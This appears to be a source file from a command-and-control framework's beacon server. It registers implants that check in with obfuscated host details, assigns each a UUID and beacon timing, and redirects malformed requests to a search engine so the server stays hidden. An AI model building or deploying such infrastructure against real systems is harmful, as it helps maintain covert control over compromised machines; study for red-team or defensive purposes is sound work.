# beacon_server/handlers/connection_handler.py

import json
import time
import uuid
import zlib
from http.server import BaseHTTPRequestHandler

from Modules.beacon.beacon import add_beacon_list
from Modules.beacon.beacon_server.utils import process_request_data
from Modules.global_objects import config, logger, obfuscation_map
from Modules.utils.ui_manager import RichPrint, log_beacon_connect, log_connection_event
from ServerDatabase.database import DatabaseClass


def handle_connection_request(
    handler: BaseHTTPRequestHandler,
    match: dict,
):
    """
    Handles a new connection request from a beacon.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    logger.info(f"Connection request from {handler.path}")

    content_len = int(handler.headers.get("Content-Length", 0))
    raw_data = handler.rfile.read(content_len)

    data, error = process_request_data(raw_data)
    if error:
        handler.send_response(400)
        handler.end_headers()
        return

    # Normalize the obfuscation mapping and extract real values from incoming data
    generic = obfuscation_map.get("generic", {})
    implant_info = (
        generic.get("implant_info", {})
        if isinstance(generic.get("implant_info", {}), dict)
        else {}
    )

    # Keys used by the client for name/os/address in the obfuscated payload
    name_key = implant_info.get("Name") or generic.get("name")
    os_key = implant_info.get("os") or generic.get("os")
    address_key = implant_info.get("address") or generic.get("address")

    # Actual values provided by the client
    name_val = data.get(name_key) if data and name_key else None
    os_val = data.get(os_key) if data and os_key else None
    address_val = data.get(address_key) if data and address_key else None

    if data and name_val and os_val and address_val:
        userID = str(uuid.uuid4())
        logger.info(
            f"New connection from {name_val} on {os_val} at {address_val} with UUID {userID}"
        )

        add_beacon_list(
            userID,
            address_val,
            name_val,
            os_val,
            time.time(),
            config["beacon"]["interval"],
            config["beacon"]["jitter"],
            config,
            None,
            None,  # modules - use default list
        )

        # Log to live events panel and terminal
        log_beacon_connect(name_val, address_val, os_val, userID)
        RichPrint.r_print(
            f"[bright_cyan]📡[/] New beacon: [bright_green]{name_val}[/] ({address_val}) - {os_val}"
        )

        # determine the JSON keys to use in the response; prefer explicit mapping from generic, then implant_info, then defaults
        timer_key = generic.get("timer") or implant_info.get("timer") or "timer"
        uuid_key = generic.get("uuid") or implant_info.get("uuid") or "uuid"
        jitter_key = generic.get("jitter") or implant_info.get("jitter") or "jitter"

        response_body = json.dumps(
            {
                timer_key: config["beacon"]["interval"],
                uuid_key: userID,
                jitter_key: config["beacon"]["jitter"],
            }
        ).encode("utf-8")

        handler.send_response(200)
        handler.send_header("Content-Type", "application/json")
        handler.send_header("Content-Length", str(len(response_body)))
        handler.end_headers()
        handler.wfile.write(response_body)
    else:
        logger.error(
            "Invalid data format in connection request (missing or unmapped obfuscated keys for Name/os/address), redirecting."
        )
        handler.send_response(302)
        handler.send_header("Location", "https://www.google.com")
        handler.end_headers()


def handle_reconnect(handler: BaseHTTPRequestHandler, match: dict):
    """
    Handles a reconnection request from a beacon.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    logger.info(f"Reconnection request from {handler.path}")

    content_len = int(handler.headers.get("Content-Length", 0))
    raw_data = handler.rfile.read(content_len)

    try:
        decompressed_data = zlib.decompress(raw_data)
        data = json.loads(decompressed_data.decode("utf-8"))
    except (zlib.error, json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to process reconnection data: {e}")
        handler.send_response(400)
        handler.end_headers()
        return

    required_keys = ["name", "os", "address", "id", "timer", "jitter"]
    if all(key in data for key in required_keys):
        add_beacon_list(
            data["id"],
            data["address"],
            data["name"],
            data["os"],
            time.time(),
            float(data["timer"]),
            float(data["jitter"]),
            config,
            from_db=False,
        )
        logger.info(f"Beacon list updated for reconnection ID: {data['id']}")

        # Log reconnection to live events panel
        log_connection_event(
            "beacon",
            f"Beacon reconnected: {data['name']} ({data['address']})",
            {"host": data["name"], "ip": data["address"], "uuid": data["id"]},
        )
        RichPrint.r_print(
            f"[bright_cyan]📡[/] Beacon reconnected: [bright_green]{data['name']}[/] ({data['address']})"
        )
        response_body = json.dumps({"x": True}).encode("utf-8")
        handler.send_response(200)
        handler.send_header("Content-Type", "application/json")
        handler.send_header("Content-Length", str(len(response_body)))
        handler.end_headers()
        handler.wfile.write(response_body)
    else:
        logger.error("Invalid data format in reconnection request.")
        handler.send_response(404)
        handler.end_headers()
